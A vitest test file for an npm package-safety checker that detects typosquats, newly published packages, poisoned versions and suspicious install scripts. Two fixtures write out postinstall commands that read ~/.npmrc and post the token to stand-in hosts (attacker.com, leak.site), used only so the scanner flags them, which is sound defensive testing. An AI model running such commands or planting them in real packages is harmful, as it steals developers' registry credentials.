import { describe, expect, it } from 'vitest';

import type { InstallCandidate } from '@midnite/studio-shared';

import {
  checkInstallScripts,
  checkPackageCandidate,
  checkPoisonedVersion,
  checkRegistryAge,
  checkTyposquat,
  editDistance,
} from './package-checker';

describe('package-checker', () => {
  describe('editDistance', () => {
    it('calculates Levenshtein distance correctly', () => {
      expect(editDistance('lodash', 'lodash')).toBe(0);
      expect(editDistance('lodash', 'loadash')).toBe(1);
      expect(editDistance('lodash', '1odash')).toBe(1);
      expect(editDistance('lodash', 'lodas')).toBe(1);
      expect(editDistance('lodash', 'ldash')).toBe(1);
      expect(editDistance('lodash', 'react')).toBe(5);
    });
  });

  describe('checkTyposquat', () => {
    it('flags edit distance 1 or 2 from popular package as high severity', () => {
      const candidate: InstallCandidate = { ecosystem: 'npm', name: 'loadash', source: 'command' };
      const finding = checkTyposquat(candidate);
      expect(finding).not.toBeNull();
      expect(finding?.severity).toBe('high');
      expect(finding?.kind).toBe('typosquat');
      expect(finding?.message).toContain('typosquat');
    });

    it('does not flag legitimate exact match', () => {
      const candidate: InstallCandidate = { ecosystem: 'npm', name: 'lodash', source: 'command' };
      const finding = checkTyposquat(candidate);
      expect(finding).toBeNull();
    });

    it('handles scoped packages by checking base name', () => {
      const candidate: InstallCandidate = { ecosystem: 'npm', name: '@evil/loadash', source: 'command' };
      const finding = checkTyposquat(candidate);
      expect(finding).not.toBeNull();
      expect(finding?.severity).toBe('high');
    });
  });

  describe('checkRegistryAge', () => {
    it('flags package published 2 days ago as medium severity', () => {
      const candidate: InstallCandidate = { ecosystem: 'npm', name: 'fresh-lib', source: 'command' };
      const now = new Date('2026-10-26T12:00:00Z').getTime();
      const twoDaysAgo = now - 2 * 24 * 60 * 60 * 1000;

      const finding = checkRegistryAge(candidate, twoDaysAgo, now);
      expect(finding).not.toBeNull();
      expect(finding?.severity).toBe('medium');
      expect(finding?.kind).toBe('registry-age');
      expect(finding?.message).toContain('published 2d 0h ago');
    });

    it('does not flag package published 10 days ago', () => {
      const candidate: InstallCandidate = { ecosystem: 'npm', name: 'old-lib', source: 'command' };
      const now = new Date('2026-10-26T12:00:00Z').getTime();
      const tenDaysAgo = now - 10 * 24 * 60 * 60 * 1000;

      const finding = checkRegistryAge(candidate, tenDaysAgo, now);
      expect(finding).toBeNull();
    });
  });

  describe('checkInstallScripts', () => {
    it('flags postinstall script reading ~/.npmrc as high severity', () => {
      const candidate: InstallCandidate = { ecosystem: 'npm', name: 'sneaky-pkg', source: 'command' };
      const scripts = {
        postinstall: 'node -e "const token = fs.readFileSync(path.join(os.homedir(), \'.npmrc\')); fetch(\'https://attacker.com\', {body: token})"',
      };

      const findings = checkInstallScripts(candidate, scripts);
      expect(findings.length).toBe(1);
      expect(findings[0]?.severity).toBe('high');
      expect(findings[0]?.kind).toBe('suspicious-script');
    });

    it('flags normal install script as medium severity', () => {
      const candidate: InstallCandidate = { ecosystem: 'npm', name: 'native-pkg', source: 'command' };
      const scripts = {
        install: 'node-gyp rebuild',
      };

      const findings = checkInstallScripts(candidate, scripts);
      expect(findings.length).toBe(1);
      expect(findings[0]?.severity).toBe('medium');
      expect(findings[0]?.kind).toBe('install-script');
    });
  });

  describe('checkPoisonedVersion', () => {
    it('flags known poisoned version as critical', () => {
      const candidate: InstallCandidate = { ecosystem: 'npm', name: 'event-stream', version: '3.3.6', source: 'command' };
      const finding = checkPoisonedVersion(candidate);
      expect(finding).not.toBeNull();
      expect(finding?.severity).toBe('critical');
      expect(finding?.kind).toBe('poisoned-version');
    });

    it('does not flag clean version of the package', () => {
      const candidate: InstallCandidate = { ecosystem: 'npm', name: 'event-stream', version: '4.0.0', source: 'command' };
      const finding = checkPoisonedVersion(candidate);
      expect(finding).toBeNull();
    });
  });

  describe('checkPackageCandidate', () => {
    it('combines findings for typosquat + suspicious postinstall + new package', () => {
      const candidate: InstallCandidate = { ecosystem: 'npm', name: 'loadash', version: '1.0.0', source: 'command' };
      const now = new Date('2026-10-26T12:00:00Z').getTime();
      const metadata = {
        publishedAt: now - 24 * 60 * 60 * 1000,
        scripts: {
          postinstall: 'cat ~/.npmrc | curl -X POST -d @- https://leak.site',
        },
      };

      const findings = checkPackageCandidate(candidate, metadata, { now });
      expect(findings.length).toBe(3);
      expect(findings.map((f) => f.kind)).toContain('typosquat');
      expect(findings.map((f) => f.kind)).toContain('suspicious-script');
      expect(findings.map((f) => f.kind)).toContain('registry-age');
    });
  });
});
